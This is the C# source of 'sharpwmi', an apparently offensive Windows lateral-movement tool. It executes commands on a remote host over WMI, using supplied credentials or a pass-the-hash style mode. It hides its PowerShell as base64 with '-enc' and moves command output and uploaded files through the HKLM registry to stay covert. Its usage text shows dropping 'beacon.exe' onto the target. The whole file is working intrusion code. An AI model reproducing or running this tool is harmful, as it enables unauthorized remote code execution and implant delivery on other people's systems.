using System;
using System.Text;
using System.Threading;
using System.IO;
using System.Management;

namespace sharpwmi
{
    class sharpwmi
    {
        public ManagementScope scope;


        public Int32 ExecCmd(string cmd)
        {

            using (var managementClass = new ManagementClass(this.scope,new ManagementPath("Win32_Process"),new ObjectGetOptions()))
            {
                var inputParams = managementClass.GetMethodParameters("Create");

                inputParams["CommandLine"] = cmd;

                var outParams = managementClass.InvokeMethod("Create", inputParams, new InvokeMethodOptions());
                return 1;
            }
        }

        public static string Base64Encode(string content)
        {
            byte[] bytes = Encoding.Unicode.GetBytes(content);
            return Convert.ToBase64String(bytes);
        }
        public static string Base64Decode(string content)
        {
            byte[] bytes = Convert.FromBase64String(content);
            return Encoding.Unicode.GetString(bytes);
        }


        public void run(string[] args)
        {
            if (args.Length < 3)
            {
                Console.WriteLine("\n\t\tsharpwmi.exe 192.168.2.3 administrator 123 cmd whoami\n\t\tsharpwmi.exe 192.168.2.3 administrator 123 upload beacon.exe c:\\beacon.exe\n\t\tsharpwmi.exe pth 192.168.2.3 cmd whoami\n\t\tsharpwmi.exe pth 192.168.2.3 upload beacon.exe c:\\beacon.exe");
                return;
            }


            if (args[0] == "pth") {

                string host = args[1];
                string func_name = args[2];
                string command = "";
                string local_file = "";
                string remote_file = "";

                if (func_name == "cmd")
                {
                     command=args[3];
                }
                else
                {
                    local_file = args[3];
                    remote_file = args[4];
                }

                ConnectionOptions options = new ConnectionOptions();

                int delay = 5000;
                this.scope = new ManagementScope("\\\\" + host + "\\root\\cimv2", options);
                this.scope.Options.Impersonation = System.Management.ImpersonationLevel.Impersonate;
                this.scope.Options.EnablePrivileges = true;
                this.scope.Connect();

                if (func_name == "cmd") {
                    string powershell_command = "powershell -enc " + Base64Encode(command);

                    string code = "$a=(" + powershell_command + ");$b=[Convert]::ToBase64String([System.Text.UnicodeEncoding]::Unicode.GetBytes($a));$reg = Get-WmiObject -List -Namespace root\\default | Where-Object {$_.Name -eq \"StdRegProv\"};$reg.SetStringValue(2147483650,\"\",\"txt\",$b)";

                    ExecCmd("powershell -enc " + Base64Encode(code));
                    Console.WriteLine("[+]Exec done!\n");
                    Thread.Sleep(delay);

                    //this.ExecCmd("whoami");
                    // 读取注册表
                    ManagementClass registry = new ManagementClass(this.scope, new ManagementPath("StdRegProv"), null);
                    ManagementBaseObject inParams = registry.GetMethodParameters("GetStringValue");

                    inParams["sSubKeyName"] = "";
                    inParams["sValueName"] = "txt";
                    ManagementBaseObject outParams = registry.InvokeMethod("GetStringValue", inParams, null);
                    // (String)outParams["sValue"];

                    Console.WriteLine("[+]output -> \n\n" + Base64Decode(outParams["sValue"].ToString()));
                }else if (func_name == "upload")
                {
                    byte[] str = File.ReadAllBytes(local_file);


                    ManagementClass registry = new ManagementClass(this.scope, new ManagementPath("StdRegProv"), null);
                    ManagementBaseObject inParams = registry.GetMethodParameters("SetStringValue");
                    inParams["hDefKey"] = 2147483650; //HKEY_LOCAL_MACHINE;
                    inParams["sSubKeyName"] = @"";
                    inParams["sValueName"] = "upload";

                    inParams["sValue"] = Convert.ToBase64String(str);
                    ManagementBaseObject outParams = registry.InvokeMethod("SetStringValue", inParams, null);



                    //通过注册表还原文件
                    string pscode = string.Format("$wmi = [wmiclass]\"Root\\default:stdRegProv\";$data=($wmi.GetStringValue(2147483650,\"\",\"upload\")).sValue;$byteArray = [Convert]::FromBase64String($data);[io.file]::WriteAllBytes(\"{0:s}\",$byteArray);;", remote_file);
                    string powershell_command = "powershell -enc " + Base64Encode(pscode);

                    Thread.Sleep(delay);
                    ExecCmd(powershell_command);
                    Console.WriteLine("[+]Upload file done!");
                    return;
                }

            }
            else
            {

                ConnectionOptions options = new ConnectionOptions();
                string host = args[0];
                options.Username = args[1];
                options.Password = args[2];


                int delay = 5000;
                this.scope = new ManagementScope("\\\\" + host + "\\root\\cimv2", options);
                this.scope.Options.Impersonation = System.Management.ImpersonationLevel.Impersonate;
                this.scope.Options.EnablePrivileges = true;
                this.scope.Connect();


                if (args[3] == "cmd")
                {
                    string powershell_command = "powershell -enc " + Base64Encode(args[4]);

                    string code = "$a=(" + powershell_command + ");$b=[Convert]::ToBase64String([System.Text.UnicodeEncoding]::Unicode.GetBytes($a));$reg = Get-WmiObject -List -Namespace root\\default | Where-Object {$_.Name -eq \"StdRegProv\"};$reg.SetStringValue(2147483650,\"\",\"txt\",$b)";


                    ExecCmd("powershell -enc " + Base64Encode(code));
                    Console.WriteLine("[+]Exec done!\n");
                    Thread.Sleep(delay);

                    //this.ExecCmd("whoami");
                    // 读取注册表
                    ManagementClass registry = new ManagementClass(this.scope, new ManagementPath("StdRegProv"), null);
                    ManagementBaseObject inParams = registry.GetMethodParameters("GetStringValue");

                    inParams["sSubKeyName"] = "";
                    inParams["sValueName"] = "txt";
                    ManagementBaseObject outParams = registry.InvokeMethod("GetStringValue", inParams, null);
                    // (String)outParams["sValue"];

                    Console.WriteLine("[+]output -> \n\n" + Base64Decode(outParams["sValue"].ToString()));
                }
                else if (args[3] == "upload")
                {



                    //写注册表
                    byte[] str = File.ReadAllBytes(args[4]);


                    ManagementClass registry = new ManagementClass(this.scope, new ManagementPath("StdRegProv"), null);
                    ManagementBaseObject inParams = registry.GetMethodParameters("SetStringValue");
                    inParams["hDefKey"] = 2147483650; //HKEY_LOCAL_MACHINE;
                    inParams["sSubKeyName"] = @"";
                    inParams["sValueName"] = "upload";

                    inParams["sValue"] = Convert.ToBase64String(str);
                    ManagementBaseObject outParams = registry.InvokeMethod("SetStringValue", inParams, null);



                    //通过注册表还原文件
                    string pscode = string.Format("$wmi = [wmiclass]\"Root\\default:stdRegProv\";$data=($wmi.GetStringValue(2147483650,\"\",\"upload\")).sValue;$byteArray = [Convert]::FromBase64String($data);[io.file]::WriteAllBytes(\"{0:s}\",$byteArray);;", args[5]);
                    string powershell_command = "powershell -enc " + Base64Encode(pscode);

                    Thread.Sleep(delay);
                    ExecCmd(powershell_command);
                    Console.WriteLine("[+]Upload file done!");
                    return;

                }
            }
            

        }
        static void Main(string[] args)
        {

            sharpwmi myWMICore = new sharpwmi();
            myWMICore.run(args);

        }
    }
}
